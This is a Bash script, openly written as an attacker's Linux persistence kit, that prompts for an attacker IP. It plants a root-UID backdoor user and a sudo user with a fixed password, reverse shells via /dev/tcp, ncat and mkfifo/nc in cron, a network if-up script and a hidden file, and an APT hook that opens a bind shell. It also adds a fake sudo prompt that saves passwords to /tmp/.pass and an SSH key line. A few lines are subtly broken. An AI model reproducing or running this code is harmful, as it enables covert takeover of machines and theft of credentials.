#!/bin/bash

echo -n "----------------------------------------------------------"
echo -n "-----------------PERSISTance is futile--------------------"
echo -n "----------------------------------------------------------"
echo -n "Enter attacker IP:"
read -r IP

echo -n "----------------------------------------------------------"
echo -n "-----------------Adding rogue users-----------------------"
echo -n "----------------------------------------------------------"

#User add persistence
sudo useradd -ou 0 -g 0 systemdd-echo 
sudo passwd systemdd-echo
echo "Password1" | passwd --stdin systemdd-echo

sudo useradd -ou 1016 -g 1016 haXor 
sudo passwd haXor
echo "Password1" | passwd --stdin haXor
sudo usermod -aG sudo haXor

echo -n "----------------------------------------------------------"
echo -n "-----------------Adding rogue files-----------------------"
echo -n "----------------------------------------------------------"


#File add persistence
echo "sh -i >& /dev/tcp/"$IP"/4444 0>&1" > /tmp/.backd00r.sh 
chmod +x /tmp/.backd00r.sh 
chmod 777 /tmp/.backd00r.sh
chattr +i /tmp/.backd00r.sh 
sudo rm /usr/bin/chattr
sudo rm /bin/chattr


echo -n "----------------------------------------------------------"
echo -n "-----------------Adding rogue cronjobs--------------------"
echo -n "----------------------------------------------------------"


#Crontab persistence - ncat reverse shell port 1234 and reverse shell port 4444
(crontab -l ; echo "@reboot sleep 200 && ncat "$IP" 1234 -e /bin/bash")|crontab 2> /dev/null

(crontab -l ; echo "* * * * * /tmp/.backd00r.sh")|crontab 2> /dev/null


echo -n "----------------------------------------------------------"
echo -n "-----------------Backdooring bashrc-----------------------"
echo -n "----------------------------------------------------------"

#Bashrc backdoor - sudo password stored in .pass
mkdir /.hidden

echo "read -sp '[sudo] password for $USER: ' sudopass" > /.hidden/fsudo
echo "" >> /.hidden/fsudo
echo "sleep 2" >> /.hidden/fsudo 
echo "Sorry, try again." >> /.hidden/fsudo
echo "$sudopass >> /tmp/.pass" >> /.hidden/fsudo
echo "/usr/bin/sudo $@" >> /.hidden/fsudo

chmod u+x /.hidden/fsudo
echo "alias sudo=/.hidden/fsudo" >> ~/.bashrc

echo -n "----------------------------------------------------------"
echo -n "-----------------Backdooring service----------------------"
echo -n "----------------------------------------------------------"

#Backdoor service - port 5555 Reverse Shell
RSHELL="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc $IP 5555 >/tmp/f"
sed -i -e "4i \$RSHELL" /etc/network/if-up.d/upstart

echo -n "----------------------------------------------------------"
echo -n "-----------------Backdooring APT--------------------------"
echo -n "----------------------------------------------------------"

#APT backdoor - ncat listener port 4321
echo 'APT::Update::Pre-Invoke {"nohup ncat -lvp 4321 -e /bin/bash 2> /dev/null &"};' > /etc/apt/apt.conf.d/42backdoor

echo -n "----------------------------------------------------------"
echo -n "-----------------Backdooring SSH--------------------------"
echo -n "----------------------------------------------------------"

echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDp/ZXN6k+AIeYXWtXC0IsVaDfh/3LprJmr65c5czg7gAWmH/EwbaVqG2RetN8AXvLIJpkUhQBbE2MRvRsqpohqBe/FF003ikT0ROY/PacU9jSSkqsfKognAMyUV++P+QfLDXHg0TJfaYucYK3CYDcwsPHSC+mMjcJhGSj0UVVUPCkoerzVA+uSw5aw64LTkoiCm7fqK7/AtiC/hMuhzkYk7vWN1NaYOKgSUXnZ99hdrowSOC8/BtPs+xhp+m85k6u0wdedyVJIt0EcH0qnpc+L0s6qTwjwAdMi9VtxTnN4PnMYB04hn5+FZ8WDgNCgGrg25Qp6ciD/lbe0+nU42v1etztfFuFCEn60zT8wGwYApejRegmRrtFQvUggC6RoxfHveGZ/p0G4ZFmo8D2j4ppsCnXbqHwNijAyoUd1SeiDtgtM9RYmnkkeH1ajaTrsiHgj4rVh2R5vvG3vkkedC/PiozHM5gdQbdXWB9Ugq0jW6uaKxhDNlKd+KUYBhl2LGIc= valley@kali" ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
chmod 700 ~/.ssh


